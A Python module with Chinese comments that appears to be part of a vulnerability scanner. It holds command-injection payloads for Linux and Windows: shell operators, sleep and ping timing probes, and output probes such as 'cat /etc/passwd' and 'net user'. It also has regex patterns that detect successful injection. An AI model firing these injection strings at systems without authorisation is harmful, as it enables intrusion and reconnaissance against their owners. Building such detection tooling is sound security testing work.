"""命令注入 Payload 库 — 按检测方法和操作系统分类

检测方法:
1. Time-based   — 注入 sleep/ping 等延迟命令，通过响应时间判断
2. Output-based — 注入 id/whoami 等命令，检查响应中是否出现命令输出
3. Error-based  — 注入触发错误的特殊字符组合
"""

from typing import List, Dict, Pattern
import re

# ========== 注入分隔符 / 操作符 ==========
# 这些操作符用于拼接/终止原命令并注入新命令
LINUX_OPERATORS = [
    ";",       # 顺序执行
    "|",       # 管道
    "||",      # 前命令失败后执行
    "&",       # 后台执行
    "&&",      # 前命令成功后执行
    "%0a",     # 换行符（URL 编码）
    "\n",      # 换行符
    "`",       # 命令替换
    "$(",      # 命令替换
    "%09",     # Tab 字符
]

WINDOWS_OPERATORS = [
    "&",       # 顺序执行
    "|",       # 管道
    "||",      # 前命令失败后执行
    "%0a",     # 换行符
    "%0d%0a",  # 回车换行
]


# ========== Time-based Payload ==========
TIME_PAYLOADS = [
    # Linux sleep
    {"payload": "sleep 5", "os": "linux", "delay": 5},
    {"payload": "sleep 10", "os": "linux", "delay": 10},
    {"payload": "ping -c 5 127.0.0.1", "os": "linux", "delay": 4},
    {"payload": "ping -c 10 127.0.0.1", "os": "linux", "delay": 9},
    # Windows sleep
    {"payload": "ping -n 5 127.0.0.1", "os": "windows", "delay": 4},
    {"payload": "ping -n 10 127.0.0.1", "os": "windows", "delay": 9},
    {"payload": "timeout /t 5 /nobreak", "os": "windows", "delay": 5},
    {"payload": "ping -n 5 127.0.0.1 > nul", "os": "windows", "delay": 4},
]

# 为 time-based payload 组装: operator + payload
# 由插件在运行时组装


# ========== Output-based Payload ==========
OUTPUT_PAYLOADS = [
    # Linux 用户信息
    {"payload": "id", "os": "linux"},
    {"payload": "whoami", "os": "linux"},
    {"payload": "uname -a", "os": "linux"},
    {"payload": "hostname", "os": "linux"},
    {"payload": "cat /etc/passwd", "os": "linux"},
    {"payload": "pwd", "os": "linux"},
    {"payload": "who", "os": "linux"},
    {"payload": "w", "os": "linux"},
    # Windows 用户信息
    {"payload": "whoami", "os": "windows"},
    {"payload": "hostname", "os": "windows"},
    {"payload": "type %SYSTEMROOT%\\win.ini", "os": "windows"},
    {"payload": "ver", "os": "windows"},
    {"payload": "ipconfig", "os": "windows"},
    {"payload": "net user", "os": "windows"},
    {"payload": "dir", "os": "windows"},
    {"payload": "systeminfo", "os": "windows"},
    # 通用
    {"payload": "whoami", "os": "both"},
    {"payload": "hostname", "os": "both"},
]


# ========== Output 检测模式 ==========
OUTPUT_PATTERNS: Dict[str, List[str]] = {
    "linux": [
        "uid=",
        "gid=",
        "groups=",
        "root:",
        "www-data",
        "daemon:",
        "bin:",
        "sys:",
        r"Linux\s+\S+\s+\d+\.\d+",
        "/bin/bash",
        "/usr/sbin/nologin",
        "context=.*:.*:.*:",
        r"\w+:x:\d+:\d+:",
    ],
    "windows": [
        r"nt authority\\system",
        r"nt authority\\network service",
        r"nt authority\\local service",
        "administrator",
        r"\\users\\",
        r"\\windows\\",
        "Microsoft Windows",
        r"\[Version\s+\d+",
        "Windows IP Configuration",
        r"\d+\.\d+\.\d+\.\d+",
        "User accounts for",
        "The command completed successfully",
        r"\[fonts\]",
        r"\[extensions\]",
    ],
    "generic": [
        r"^\w+$",          # 单行用户名
        r"^\w+\\\w+$",     # DOMAIN\user 格式
    ],
}


# ========== Error-based Payload ==========
ERROR_PROBES = [
    # 单字符操作符 — 可能触发语法错误或产生不同的错误输出
    {"payload": ";", "type": "operator"},
    {"payload": "|", "type": "operator"},
    {"payload": "&", "type": "operator"},
    {"payload": "%0a", "type": "operator"},
    {"payload": "`", "type": "operator"},
    {"payload": "$(", "type": "operator"},
    # 无效命令 — 触发"command not found"等错误
    {"payload": "invalid_cmd_test_12345", "type": "nonexistent"},
    # 命令输出重定向到页面
    {"payload": "echo VULNSCANNER_TEST_MARKER", "type": "echo"},
]

# 错误特征模式
ERROR_PATTERNS: Dict[str, List[str]] = {
    "linux": [
        "command not found",
        "not found",
        "No such file or directory",
        "cannot execute",
        "Permission denied",
        "sh:",
        "bash:",
        "/bin/sh:",
    ],
    "windows": [
        "is not recognized as an internal or external command",
        "operable program or batch file",
        "The system cannot find the path specified",
        "Access is denied",
        "'cmd' is not recognized",
    ],
    "generic": [
        "VULNSCANNER_TEST_MARKER",
    ],
}


# ========== 常用注入 Payload 组合 ==========
# 预先组装 operator + payload 的完整注入字符串
def _build_combinatorial(operators: List[str], commands: List[str]) -> List[str]:
    """将操作符与命令组合成完整注入 payload"""
    result = []
    for op in operators:
        for cmd in commands:
            result.append(f"{op}{cmd}")
    return result


# 预构建: Linux time-based payloads
LINUX_TIME_INJECTIONS = _build_combinatorial(
    LINUX_OPERATORS,
    ["sleep 5", "sleep 10", "ping -c 5 127.0.0.1"],
)

# 预构建: Windows time-based payloads
WINDOWS_TIME_INJECTIONS = _build_combinatorial(
    WINDOWS_OPERATORS,
    ["ping -n 5 127.0.0.1", "timeout /t 5 /nobreak"],
)

# 预构建: output-based payloads（通用）
OUTPUT_INJECTIONS = _build_combinatorial(
    LINUX_OPERATORS[:6] + WINDOWS_OPERATORS[:2],
    ["whoami", "id", "hostname"],
)


# ========== Getter 函数 ==========

def get_time_payloads() -> List[Dict]:
    """获取 Time-based Payload（运行时组装 operator + command）"""
    return TIME_PAYLOADS


def get_output_payloads() -> List[Dict]:
    """获取 Output-based Payload"""
    return OUTPUT_PAYLOADS


def get_error_probes() -> List[Dict]:
    """获取 Error-based 探测 Payload"""
    return ERROR_PROBES


def get_linux_operators() -> List[str]:
    """获取 Linux 命令分隔符列表"""
    return LINUX_OPERATORS


def get_windows_operators() -> List[str]:
    """获取 Windows 命令分隔符列表"""
    return WINDOWS_OPERATORS


def get_all_operators() -> List[str]:
    """获取所有操作符（去重）"""
    seen = set()
    result = []
    for op in LINUX_OPERATORS + WINDOWS_OPERATORS:
        if op not in seen:
            seen.add(op)
            result.append(op)
    return result


def get_output_patterns() -> Dict[str, List[str]]:
    """获取输出检测模式"""
    return OUTPUT_PATTERNS


def get_error_patterns() -> Dict[str, List[str]]:
    """获取错误特征模式"""
    return ERROR_PATTERNS


def get_linux_time_injections() -> List[str]:
    """获取预构建的 Linux time-based 注入字符串"""
    return LINUX_TIME_INJECTIONS


def get_windows_time_injections() -> List[str]:
    """获取预构建的 Windows time-based 注入字符串"""
    return WINDOWS_TIME_INJECTIONS


def get_output_injections() -> List[str]:
    """获取预构建的 output-based 注入字符串"""
    return OUTPUT_INJECTIONS


def detect_os_from_output(output: str) -> str | None:
    """根据命令输出判断目标操作系统

    Returns:
        "linux", "windows", 或 None
    """
    output_lower = output.lower()

    linux_indicators = ["uid=", "gid=", "linux", "/bin/bash", "www-data", "daemon:"]
    windows_indicators = [
        "nt authority",
        "microsoft windows",
        "windows ip configuration",
        "[version",
        "systemroot",
    ]

    for indicator in windows_indicators:
        if indicator in output_lower:
            return "windows"

    for indicator in linux_indicators:
        if indicator in output_lower:
            return "linux"

    return None


def match_output_pattern(text: str) -> tuple[str | None, str | None]:
    """匹配文本中的命令输出特征

    Args:
        text: 响应文本

    Returns:
        (os_type, matched_pattern) 元组，无匹配时返回 (None, None)
    """
    for os_type in ["linux", "windows", "generic"]:
        patterns = OUTPUT_PATTERNS.get(os_type, [])
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return (os_type if os_type != "generic" else None, pattern)

    return (None, None)


def match_error_pattern(text: str) -> tuple[str | None, str | None]:
    """匹配文本中的命令错误特征

    Args:
        text: 响应文本

    Returns:
        (os_type, matched_pattern) 元组，无匹配时返回 (None, None)
    """
    for os_type in ["linux", "windows", "generic"]:
        patterns = ERROR_PATTERNS.get(os_type, [])
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return (os_type if os_type != "generic" else None, pattern)

    return (None, None)
